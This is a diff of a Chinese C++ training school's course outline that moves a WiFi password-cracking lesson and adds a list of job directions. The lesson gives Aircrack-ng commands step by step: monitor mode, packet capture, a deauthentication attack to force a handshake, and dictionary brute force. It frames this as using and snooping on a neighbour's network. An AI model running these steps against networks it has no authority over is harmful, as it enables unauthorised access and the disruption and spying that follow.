@@ -10,61 +10,6 @@
 5. 枚举字典，暴力破解
 6. 轻松使用”隔壁老王“的wifi
 # 【课程详情】
-##  Wifi密码破解原理剖析
-## Aircrack-ng
-### 下载
-
-	http://www.aircrack-ng.org/
-	http://www.aircrack-ng.org/downloads.html
-	wget http://download.aircrack-ng.org/aircrack-ng-1.2-rc2.tar.gz
-
-### 安装
-
-	sudo apt-get install build-essential libssl-dev pkg-config libnl-3-dev libnl-genl-3-dev
-	tar xvf aircrack-ng-1.2-rc2.tar.gz
-	cd aircrack-ng-1.2-rc2
-	make
-	sudo make install
-## WIFI 密码破解
-1. 查看本机电脑无线网卡
-
-	iwconfig  或者 ifconfig
-
-2. 激活网卡到monitor模式，得到监控模式下的设备名为wlan0mon
-
-	sudo airmon-ng  start  wlan0
-
-3. 探测无线网络，选取破解路由器对象
-
-	 sudo airodump-ng  wlang0mon
-
-4. 设定监控频道，抓取被选定路由器的数据包，始终运行
-
-	sudo airodump-ng  --ivs  -w  linuxcpp  -c  6  wlang0mon
-
-	捕获的包存入linuxcp-0x.ivs 文件。x为序号
-
-5. 新开终端，发起Deauth攻击，迫使客户端重新链接路由器
-
-	sudo aireplay-ng  -0  1  -a 路由器MAC  -h  合法链接客户端MAC   wlan0mon
-
-	De-Authentication DoS
-	去验证洪水攻击，国际上称之为De-authentication Flood Attack，全称即去身份验证洪水攻击或去验证阻断洪水攻击，通常被简称为Deauth攻击，是无线网络拒绝服务攻击的一种形式，它旨在通过欺骗从AP到客户端单播地址的去身份验证帧来将客户端转为未关联的/未认证的状态。
-
-如果Deauth攻击成功，airodump-ng捕获handshake ，此时可以ctrl+c终止airodump-ng抓包。
-
-![四次握手包](https://raw.githubusercontent.com/xwpfullstack/openlessons/dev/img/%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E5%8C%85.png "四次握手包")
-
-6. aircrack-ng 穷举字典，暴力破解
-
-	sudo aircrack-ng  -w  dic  linuxcpp-01.ivs
-
-	破解成功与否取决与字典是否涵盖全面，破解速度取决于硬件计算性能和字典优化
-![破解](https://raw.githubusercontent.com/xwpfullstack/openlessons/dev/img/1.png "破解")
-
-![成功破解](https://raw.githubusercontent.com/xwpfullstack/openlessons/dev/img/%E7%A0%B4%E8%A7%A3%E6%88%90%E5%8A%9F.png "成功破解")
-
-## 字典开发
 
 ##  网络数据抓包与分析
 
@@ -128,9 +73,76 @@ wireshark左上角，查找list那个钮。
 
 	捕获登陆某网站的表单，分析其账号和密码。
 
+##  Wifi密码破解原理剖析
+
+画图示意
+
+## Aircrack-ng
+### 下载
+
+	http://www.aircrack-ng.org/
+	http://www.aircrack-ng.org/downloads.html
+	wget http://download.aircrack-ng.org/aircrack-ng-1.2-rc2.tar.gz
+
+### 安装
+
+	sudo apt-get install build-essential libssl-dev pkg-config libnl-3-dev libnl-genl-3-dev
+	tar xvf aircrack-ng-1.2-rc2.tar.gz
+	cd aircrack-ng-1.2-rc2
+	make
+	sudo make install
+## WIFI 密码破解
+1. 查看本机电脑无线网卡
+
+	iwconfig  或者 ifconfig
+
+2. 激活网卡到monitor模式，得到监控模式下的设备名为wlan0mon
+
+	sudo airmon-ng  start  wlan0
+
+3. 探测无线网络，选取破解路由器对象
+
+	 sudo airodump-ng  wlang0mon
+
+4. 设定监控频道，抓取被选定路由器的数据包，始终运行
+
+	sudo airodump-ng  --ivs  -w  linuxcpp  -c  6  wlang0mon
+
+	捕获的包存入linuxcp-0x.ivs 文件。x为序号
+
+5. 新开终端，发起Deauth攻击，迫使客户端重新链接路由器
+
+	sudo aireplay-ng  -0  1  -a 路由器MAC  -h  合法链接客户端MAC   wlan0mon
+
+	De-Authentication DoS
+	去验证洪水攻击，国际上称之为De-authentication Flood Attack，全称即去身份验证洪水攻击或去验证阻断洪水攻击，通常被简称为Deauth攻击，是无线网络拒绝服务攻击的一种形式，它旨在通过欺骗从AP到客户端单播地址的去身份验证帧来将客户端转为未关联的/未认证的状态。
+
+如果Deauth攻击成功，airodump-ng捕获handshake ，此时可以ctrl+c终止airodump-ng抓包。
+
+![四次握手包](https://raw.githubusercontent.com/xwpfullstack/openlessons/dev/img/%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E5%8C%85.png "四次握手包")
+
+6. aircrack-ng 穷举字典，暴力破解
+
+	sudo aircrack-ng  -w  dic  linuxcpp-01.ivs
+
+	破解成功与否取决与字典是否涵盖全面，破解速度取决于硬件计算性能和字典优化
+![破解](https://raw.githubusercontent.com/xwpfullstack/openlessons/dev/img/1.png "破解")
+
+![成功破解](https://raw.githubusercontent.com/xwpfullstack/openlessons/dev/img/%E7%A0%B4%E8%A7%A3%E6%88%90%E5%8A%9F.png "成功破解")
+
+## 字典开发
+
 ### 隔壁老王，蹭了你的网，看了你的信，就差......
 
 如何防御呢？如何更灵活的进攻呢？欢迎大家走进传智播客c++学院，掌握高性能的c/c++语言，精通高B格的Linux系统编程，想要什么工具？自己写起。。。
+
+## c++学院学员就业方向
+1. 服务器开发
+2. MFC和QT应用程序开发
+3. Linux/Android系统开发
+4. 数据库开发
+5. 网络安全开发
+6. web全栈开发（Django）
 
 ## 广州c++分校开班 —— 2016年3月20号
 
